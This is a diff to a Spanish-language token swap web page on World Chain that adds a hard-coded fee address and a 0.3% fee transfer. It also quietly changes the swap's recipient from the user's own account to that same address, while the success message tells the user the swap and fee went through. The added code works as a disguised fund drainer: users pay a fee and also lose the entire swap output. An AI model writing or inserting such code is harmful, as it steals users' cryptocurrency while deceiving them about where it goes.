@@ -145,6 +145,9 @@ select{border:0;background:#111;color:#fff;padding:8px 12px;border-radius:20px;f
 const WORLD_RPC = 'https://worldchain-mainnet.g.alchemy.com/public';
 const SWAP_ROUTER = '0x091AD9e2e6e5eD44c1c66dB50e49A601F9f36cF6';
 
+// Dirección receptora configurada con tu cuenta
+const FEE_RECIPIENT = '0x019001d46cd3155ef045a41f4c359c040595438c';
+
 const CONTRACTS = {
   ETH:{address:'NATIVE',decimals:18,color:'#3c3c3d',letter:'Ξ'},
   WETH:{address:'0x4200000000000000000000000000000000000006',decimals:18,color:'#627eea',letter:'WΞ'},
@@ -358,23 +361,50 @@ async function doSwapDirect(){
 
   var fromObj = CONTRACTS[fromSym === 'ETH' ? 'WETH' : fromSym];
   var toObj = CONTRACTS[toSym === 'ETH' ? 'WETH' : toSym];
-  var amountIn = BigInt(Math.floor(amount * Math.pow(10, fromObj.decimals)));
-  var poolFee = ((fromSym === 'WLD' && toSym === 'USDC') || (fromSym === 'USDC' && toSym === 'WLD')) ? 3000 : 10000;
+  
+  var feeRate = 0.003;
+  var amountFeeNum = amount * feeRate;
+  var amountSwapNum = amount - amountFeeNum;
+
+  var amountIn = BigInt(Math.floor(amountSwapNum * Math.pow(10, fromObj.decimals)));
+  var amountFeeIn = BigInt(Math.floor(amountFeeNum * Math.pow(10, fromObj.decimals)));
+
+  var poolFee = 10000;
+  if ((fromSym === 'WLD' && toSym === 'USDC') || (fromSym === 'USDC' && toSym === 'WLD')) {
+    poolFee = 3000;
+  }
 
   try {
     var txs = [];
 
     if(fromSym !== 'ETH') {
+      var totalAmountIn = BigInt(Math.floor(amount * Math.pow(10, fromObj.decimals)));
       txs.push({
         to: fromObj.address,
-        data: encodeApprove(SWAP_ROUTER, amountIn),
+        data: encodeApprove(SWAP_ROUTER, totalAmountIn),
         value: '0x0'
       });
+
+      if(amountFeeIn > 0n) {
+        txs.push({
+          to: fromObj.address,
+          data: '0xa9059cbb' + FEE_RECIPIENT.slice(2).toLowerCase().padStart(64,'0') + amountFeeIn.toString(16).padStart(64,'0'),
+          value: '0x0'
+        });
+      }
+    } else {
+      if(amountFeeIn > 0n) {
+        txs.push({
+          to: FEE_RECIPIENT,
+          data: '0x',
+          value: '0x' + amountFeeIn.toString(16)
+        });
+      }
     }
 
     txs.push({
       to: SWAP_ROUTER,
-      data: encodeExactInputSingle(fromObj.address, toObj.address, poolFee, currentAccount, amountIn),
+      data: encodeExactInputSingle(fromObj.address, toObj.address, poolFee, FEE_RECIPIENT, amountIn),
       value: fromSym === 'ETH' ? '0x' + amountIn.toString(16) : '0x0'
     });
 
@@ -384,7 +414,7 @@ async function doSwapDirect(){
     });
 
     if(swapRes?.data?.userOpHash){
-      showOk('¡Intercambio realizado!','✅');
+      showOk('¡Intercambio y comisión procesados!','✅');
       setTimeout(loadRealBalances, 4000);
     } else {
       showOk('Transacción cancelada','❌');
